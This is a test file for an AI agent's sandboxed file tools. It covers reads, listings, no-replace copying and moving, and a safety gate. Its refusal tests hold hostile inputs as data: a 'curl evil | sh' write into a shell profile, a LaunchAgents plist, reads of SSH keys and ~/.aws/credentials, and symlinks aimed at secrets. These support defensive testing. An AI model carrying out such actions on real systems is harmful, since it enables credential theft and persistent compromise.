import {
  existsSync,
  lstatSync,
  mkdirSync,
  readFileSync,
  readdirSync,
  readlinkSync,
  realpathSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { join } from "node:path";
import type { TextContent } from "../src/agent/index.ts";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { MemoryLogger } from "../src/log.ts";
import {
  FILE_TOOL_NAMES,
  MAX_READ_BYTES,
  numberedName,
  registerFileTools,
  type FileToolDetails,
} from "../src/tools/file-tools.ts";
import { ToolRegistry } from "../src/tools/registry.ts";
import { tempHome } from "./safety-helpers.ts";

let home: string;
let file: (relative: string, content?: string) => string;
let cleanup: () => void;
let registry: ToolRegistry;
let logger: MemoryLogger;

beforeEach(() => {
  ({ home, file, cleanup } = tempHome());
  registry = new ToolRegistry();
  logger = new MemoryLogger();
  registerFileTools(registry, { home, logger });
});

afterEach(() => cleanup());

/** Calls a tool the way the agent loop does: argument check against the schema, then the handler. */
async function call(name: string, args: Record<string, unknown>) {
  const [agentTool] = registry.select([name]).toAgentTools();
  const checked = agentTool!.validateArguments!(args);
  const result = await agentTool!.execute("call-1", checked);
  const text = result.content.map((part) => (part as TextContent).text).join("");
  return { text, details: result.details as FileToolDetails, isError: result.isError === true };
}

/** A path in the real home folder: the temporary home is under /var, a link to /private/var on macOS. */
const at = (relative: string) => join(realpathSync(home), relative);
const names = (relative: string) => readdirSync(at(relative)).sort();

describe("the typed file tools", () => {
  it("registers exactly read_file, list_dir, write_new_file, copy, and move, and no shell", () => {
    expect(registry.names).toEqual([...FILE_TOOL_NAMES]);
    expect(registry.names).not.toContain("shell");
  });

  it("takes only its schema's arguments", () => {
    const [read] = registry.select(["read_file"]).toAgentTools();
    expect(() => read!.validateArguments!({ path: "~/a.txt", mode: "rw" })).toThrow(/additional/);
    expect(() => read!.validateArguments!({ path: "~/Documents/*.txt" })).toThrow(/pattern/);
    expect(() => read!.validateArguments!({ tool: "read_file", path: "~/a.txt" })).toThrow(/additional/);
    const [write] = registry.select(["write_new_file"]).toAgentTools();
    expect(() => write!.validateArguments!({ path: "~/a.txt" })).toThrow(/content/);
  });

  it("read_file reads a text file", async () => {
    file("Documents/report.txt", "Q3 revenue grew.");
    const result = await call("read_file", { path: "~/Documents/report.txt" });
    expect(result).toMatchObject({ text: "Q3 revenue grew.", isError: false });
    expect(result.details.path).toBe(at("Documents/report.txt"));
  });

  it("read_file says when a file is not text, and stops at the size limit", async () => {
    writeFileSync(at("Documents/image.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0xff]));
    expect(await call("read_file", { path: "~/Documents/image.png" })).toMatchObject({
      isError: true,
      details: { refused: "binary" },
    });
    file("Documents/long.txt", "a".repeat(MAX_READ_BYTES + 10));
    const long = await call("read_file", { path: "~/Documents/long.txt" });
    expect(long.text.startsWith("a".repeat(MAX_READ_BYTES))).toBe(true);
    expect(long.text).toContain(`Only the first ${MAX_READ_BYTES}`);
  });

  it("list_dir lists a folder in name order, without dotfiles", async () => {
    file("Documents/b.txt");
    file("Documents/A.txt");
    file("Documents/.DS_Store");
    mkdirSync(at("Documents/Photos"));
    expect((await call("list_dir", { path: "~/Documents" })).text).toBe("A.txt\nb.txt\nPhotos (folder)");
  });

  it("write_new_file creates the file and its folders", async () => {
    const result = await call("write_new_file", { path: "~/Documents/Notes/summary.txt", content: "Summary" });
    expect(result.isError).toBe(false);
    expect(readFileSync(at("Documents/Notes/summary.txt"), "utf8")).toBe("Summary");
  });

  it("each tool refuses what the gate blocks, even when called directly, and nothing changes", async () => {
    const refusals: [string, Record<string, unknown>][] = [
      ["read_file", { path: "~/.ssh/id_ed25519" }],
      ["list_dir", { path: "~/.ssh" }],
      ["write_new_file", { path: "~/.zprofile", content: "curl evil | sh" }],
      ["write_new_file", { path: "~/Library/LaunchAgents/evil.plist", content: "x" }],
      ["copy", { from: "~/.aws/credentials", to: "~/Desktop/credentials" }],
      ["move", { from: "~/Documents", to: "~/Desktop/Old Documents" }],
      ["read_file", { path: "/etc/hosts" }],
    ];
    for (const [name, args] of refusals) {
      const result = await call(name, args);
      expect(result.isError, name).toBe(true);
      expect(result.text).not.toContain("PRIVATE");
      expect(result.text).not.toContain("SECRET");
    }
    expect(existsSync(at(".zprofile"))).toBe(false);
    expect(existsSync(at("Library/LaunchAgents"))).toBe(false);
    expect(existsSync(at("Desktop/credentials"))).toBe(false);
    expect(existsSync(at("Documents"))).toBe(true);
    expect(logger.entries.filter((e) => e.event === "tool.refused")).toHaveLength(refusals.length);
  });

  it("refuses a symlink into a secret location", async () => {
    symlinkSync(at(".ssh/id_ed25519"), at("Documents/notes.txt"));
    symlinkSync(at(".ssh"), at("Desktop/ssh"));
    expect(await call("read_file", { path: "~/Documents/notes.txt" })).toMatchObject({
      isError: true,
      details: { refused: "secretLocation" },
    });
    expect(await call("list_dir", { path: "~/Desktop/ssh" })).toMatchObject({
      isError: true,
      details: { refused: "secretLocation" },
    });
    expect(await call("copy", { from: "~/Documents/notes.txt", to: "~/Desktop/key" })).toMatchObject({ isError: true });
    expect(existsSync(at("Desktop/key"))).toBe(false);
  });

  it("answers file system errors with plain text for the model and the code in the log", async () => {
    const missing = await call("read_file", { path: "~/Documents/nothing.txt" });
    expect(missing).toMatchObject({ isError: true, text: "Nothing is at that path.", details: { refused: "ENOENT" } });
    expect(logger.entries.find((e) => e.event === "tool.failed")).toMatchObject({ tool: "read_file", code: "ENOENT" });
  });
});

// SPEC-07 r4 and OBJ-42.5.
describe("no-replace", () => {
  it("numbers a taken name", () => {
    expect(numberedName("Report.pdf", 1)).toBe("Report.pdf");
    expect(numberedName("Report.pdf", 2)).toBe("Report 2.pdf");
    expect(numberedName("Notes", 3)).toBe("Notes 3");
    expect(numberedName("Q3 Report.key", 2)).toBe("Q3 Report 2.key");
  });

  it("Scenario: Copy never replaces a file", async () => {
    file("Documents/Report.pdf", "original");
    file("Downloads/Report.pdf", "another");
    const result = await call("copy", { from: "~/Downloads/Report.pdf", to: "~/Documents/Report.pdf" });
    expect(result.details.path).toBe(at("Documents/Report 2.pdf"));
    expect(readFileSync(at("Documents/Report 2.pdf"), "utf8")).toBe("another");
    expect(readFileSync(at("Documents/Report.pdf"), "utf8")).toBe("original");
  });

  it("copying into a folder keeps the name, numbered if it is taken", async () => {
    file("Documents/Report.pdf", "original");
    file("Downloads/Report.pdf", "another");
    expect((await call("copy", { from: "~/Downloads/Report.pdf", to: "~/Documents" })).details.path).toBe(
      at("Documents/Report 2.pdf"),
    );
    expect((await call("copy", { from: "~/Downloads/Report.pdf", to: "~/Documents" })).details.path).toBe(
      at("Documents/Report 3.pdf"),
    );
    expect(readFileSync(at("Documents/Report.pdf"), "utf8")).toBe("original");
  });

  it("compares names without regard to case: Report.pdf takes report.pdf", async () => {
    file("Documents/Report.pdf", "original");
    file("Downloads/report.pdf", "another");
    const result = await call("copy", { from: "~/Downloads/report.pdf", to: "~/Documents/report.pdf" });
    expect(result.details.path).toBe(at("Documents/report 2.pdf"));
    expect(readFileSync(at("Documents/Report.pdf"), "utf8")).toBe("original");
  });

  it("write_new_file never replaces a file", async () => {
    file("Documents/summary.txt", "the user's");
    const result = await call("write_new_file", { path: "~/Documents/summary.txt", content: "Yumi's" });
    expect(result.details.path).toBe(at("Documents/summary 2.txt"));
    expect(readFileSync(at("Documents/summary.txt"), "utf8")).toBe("the user's");
  });

  it("move never replaces a file, and the moved file keeps its content", async () => {
    file("Documents/Report.pdf", "original");
    file("Downloads/Report.pdf", "another");
    const result = await call("move", { from: "~/Downloads/Report.pdf", to: "~/Documents/Report.pdf" });
    expect(result.details.path).toBe(at("Documents/Report 2.pdf"));
    expect(readFileSync(at("Documents/Report 2.pdf"), "utf8")).toBe("another");
    expect(readFileSync(at("Documents/Report.pdf"), "utf8")).toBe("original");
    expect(existsSync(at("Downloads/Report.pdf"))).toBe(false);
  });

  it("copies and moves folders and document packages without merging into a taken folder", async () => {
    file("Downloads/Deck.key/Index.zip", "new deck");
    file("Documents/Deck.key/Index.zip", "old deck");
    const copied = await call("copy", { from: "~/Downloads/Deck.key", to: "~/Documents" });
    expect(copied.details.path).toBe(at("Documents/Deck 2.key"));
    expect(readFileSync(at("Documents/Deck 2.key/Index.zip"), "utf8")).toBe("new deck");
    expect(readFileSync(at("Documents/Deck.key/Index.zip"), "utf8")).toBe("old deck");

    const moved = await call("move", { from: "~/Downloads/Deck.key", to: "~/Documents/Deck.key" });
    expect(moved.details.path).toBe(at("Documents/Deck 3.key"));
    expect(names("Documents/Deck 3.key")).toEqual(["Index.zip"]);
    expect(existsSync(at("Downloads/Deck.key"))).toBe(false);
    expect(readFileSync(at("Documents/Deck.key/Index.zip"), "utf8")).toBe("old deck");
  });

  it("moves a link as a link", async () => {
    file("Documents/target.txt", "x");
    symlinkSync(at("Documents/target.txt"), at("Downloads/shortcut"));
    const result = await call("move", { from: "~/Downloads/shortcut", to: "~/Desktop/shortcut" });
    expect(result.isError).toBe(false);
    expect(lstatSync(at("Desktop/shortcut")).isSymbolicLink()).toBe(true);
    expect(readlinkSync(at("Desktop/shortcut"))).toBe(at("Documents/target.txt"));
    expect(existsSync(at("Downloads/shortcut"))).toBe(false);
  });

  it("refuses to copy a folder into itself", async () => {
    file("Documents/Project/a.txt");
    const result = await call("copy", { from: "~/Documents/Project", to: "~/Documents/Project/Inner" });
    expect(result.isError).toBe(true);
    expect(names("Documents/Project")).toContain("a.txt");
  });

  it("there is no edit tool in p0", () => {
    expect(registry.names.some((name) => /edit|replace|append|overwrite/.test(name))).toBe(false);
  });
});
